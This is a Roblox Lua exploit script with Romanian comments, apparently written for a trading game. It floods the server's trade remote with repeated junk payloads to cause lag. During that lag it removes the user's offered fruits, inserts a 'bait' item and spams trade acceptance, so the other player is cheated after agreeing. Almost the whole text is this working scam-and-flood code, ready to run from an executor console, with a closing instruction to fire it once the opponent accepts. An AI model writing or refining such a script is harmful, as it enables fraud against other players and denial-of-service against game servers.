-- [[ MISSION: IMPOSSIBLE - THE ULTIMATE SWITCH ]] --
-- Creat pentru: Agent Mihnea & Elon
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local remote = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("CommF_")

-- SETARI: Pune aici numele fructelor tale "momeala" (Legendare)
local momeala = {"Quake-Quake", "Love-Love", "Spider-Spider", "Magma-Magma"}

_G.MissionActive = true

function ExecutaAtacul()
    print("🕵️‍♂️ START MISIUNE: FREEZE & SWITCH ACTIVAT!")
    
    -- 1. FAZA DE "FOC" (Lag masiv 20 secunde)
    task.spawn(function()
        local payload = string.rep("MIHNEA_ELON_HACK", 1500)
        for i = 1, 300 do
            if not _G.MissionActive then break end
            remote:InvokeServer("TradeUpdate", {["L"] = payload})
            task.wait(0.01) 
        end
    end)

    -- 2. SCHIMBUL FULGER (Aspiratorul)
    task.wait(0.3) -- Asteptam sa se simta lag-ul
    
    -- Scoatem tot ce ai pus (Fructele bune)
    for i = 1, 4 do
        remote:InvokeServer("RemoveItem", i)
    end
    
    task.wait(0.1)
    
    -- Punem "Momeala" (Legendarul)
    remote:InvokeServer("AddItem", momeala[1]) -- Pune prima din lista

    -- 3. FORTAREA ACCEPTULUI (Spam pe server)
    print("🚀 Fortam Acceptul... Zidul este jos!")
    for i = 1, 100 do
        if not _G.MissionActive then break end
        remote:InvokeServer("TradeAccept")
        task.wait(0.01)
    end
    
    _G.MissionActive = false
    print("✅ MISIUNE INDEPLINITA!")
end

-- Interfata mica pentru Delta
print("--- SCRIPT INCARCAT ---")
print("Foloseste: ExecutaAtacul() in consola cand adversarul a dat Accept!")
